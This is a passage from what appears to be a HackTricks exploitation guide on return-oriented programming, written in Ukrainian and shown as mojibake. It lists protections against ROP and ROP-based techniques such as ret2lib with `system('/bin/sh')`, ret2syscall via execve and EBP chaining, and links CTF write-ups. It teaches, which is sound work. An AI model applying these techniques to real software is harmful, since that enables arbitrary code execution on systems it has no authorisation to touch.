[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): –¶—ñ –∑–∞—Ö–∏—Å—Ç–∏ —É—Å–∫–ª–∞–¥–Ω—é—é—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ROP, –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∏ –≥–∞–¥–∂–µ—Ç—ñ–≤ –∑–º—ñ–Ω—é—é—Ç—å—Å—è –º—ñ–∂ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è–º.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): –£ –≤–∏–ø–∞–¥–∫—É –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞, –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç —Å—Ç–µ–∫–æ–≤–æ–≥–æ –∫–∞–Ω–∞—Ä–µ–π–∫–∏, —â–æ–± –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è ROP –ª–∞–Ω—Ü—é–∂–∫–æ–º.
* **–í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –≥–∞–¥–∂–µ—Ç—ñ–≤**: –Ø–∫—â–æ –≥–∞–¥–∂–µ—Ç—ñ–≤ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ, –Ω–µ –±—É–¥–µ –º–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ ROP –ª–∞–Ω—Ü—é–∂–æ–∫.

## –¢–µ—Ö–Ω—ñ–∫–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ ROP

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ ROP - —Ü–µ –ª–∏—à–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É. –ù–∞ –æ—Å–Ω–æ–≤—ñ ROP –±—É–ª–æ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–æ –±–∞–≥–∞—Ç–æ —Ç–µ—Ö–Ω—ñ–∫ Ret2XXX:

* **Ret2lib**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ ROP –¥–ª—è –≤–∏–∫–ª–∏–∫—É –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π –∑ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑ –¥–æ–≤—ñ–ª—å–Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ (–∑–∞–∑–≤–∏—á–∞–π —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ ROP –¥–ª—è –ø—ñ–¥–≥–æ—Ç–æ–≤–∫–∏ –≤–∏–∫–ª–∏–∫—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `execve`, —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: –ü–µ—Ä—à–µ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ EBP –∑–∞–º—ñ—Å—Ç—å EIP –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é –ø–æ—Ç–æ–∫—É, –∞ –¥—Ä—É–≥–µ —Å—Ö–æ–∂–µ –Ω–∞ Ret2lib, –∞–ª–µ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—ñ–∫ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∞–¥—Ä–µ—Å–∞–º–∏ EBP (—Ö–æ—á–∞ —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## –Ü–Ω—à—ñ –ü—Ä–∏–∫–ª–∞–¥–∏ —Ç–∞ –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 –±—ñ—Ç–∏, Pie —Ç–∞ nx —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –Ω–µ–º–∞—î –∫–∞–Ω–∞—Ä–µ–π–∫–∏, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ RIP –∑ –∞–¥—Ä–µ—Å–æ—é `vsyscall` –∑ —î–¥–∏–Ω–∏–º –º–µ—Ç–æ—é –∞–±–æ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∞–¥—Ä–µ—Å–∏ –≤ —Å—Ç–µ–∫—É, —è–∫–∞ –±—É–¥–µ —á–∞—Å—Ç–∫–æ–≤–∏–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–æ–º –∞–¥—Ä–µ—Å–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —á–∞—Å—Ç–∏–Ω–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –≤–∏—Ç—ñ–∫–∞—î –ø—Ä–∞–ø–æ—Ä–µ—Ü—å
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, –±–µ–∑ ASLR, ROP –≥–∞–¥–∂–µ—Ç –¥–ª—è –∑—Ä–æ–±–ª–µ–Ω–Ω—è —Å—Ç–µ–∫—É –≤–∏–∫–æ–Ω–∞–≤—á–∏–º —Ç–∞ –ø–µ—Ä–µ—Ö–æ–¥—É –¥–æ shellcode –≤ —Å—Ç–µ—Ü—ñ

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
{% endhint %}
